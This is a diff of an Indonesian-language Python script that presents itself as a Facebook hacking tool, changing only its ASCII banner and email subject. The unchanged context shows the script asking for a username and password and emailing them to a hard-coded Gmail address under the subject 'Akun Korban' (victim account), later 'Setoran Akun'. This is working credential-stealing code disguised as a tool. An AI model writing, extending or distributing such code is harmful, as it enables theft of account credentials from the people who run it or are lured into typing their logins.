@@ -14,21 +14,23 @@ print (colored('paket selesai di install.','blue'))
 
 baner = """
 
-___________                  ___.                  __    
+  ______             _                 _    
 
-\_   _____/____    ____  ____\_ |__   ____   ____ |  | __
+ |  ____|           | |               | |   
 
- |    __) \__  \ _/ ___\/ __ \| __ \ /  _ \ /  _ \|  |/ /
+ | |__ __ _  ___ ___| |__   ___   ___ | | __
 
- |     \   / __ \\  \__\  ___/| \_\ (  <_> |  <_> )    < 
+ |  __/ _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
 
- \___  /  (____  /\___  >___  >___  /\____/ \____/|__|_ \
+ | | | (_| | (_|  __/ |_) | (_) | (_) |   < 
 
-     \/        \/     \/    \/    \/                   \/
+ |_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\
 
-             Tools Hacking Facebook 100% work
+                                                                                     
 
-             Author By: Mr.B0g3L
+ Tools Hacking Facebook 100% work
+
+ Author By: Mr.B0g3L
 
         """
 
@@ -44,7 +46,7 @@ password = str (input(colored('Masukan Password: ','white')))
 
 body = ('username: '+username,  'password: '+password)
 
-subject = 'Akun Korban'
+subject = 'Setoran Akun'
 
 anjirt.send('wirdagans@gmail.com',subject,body)
 
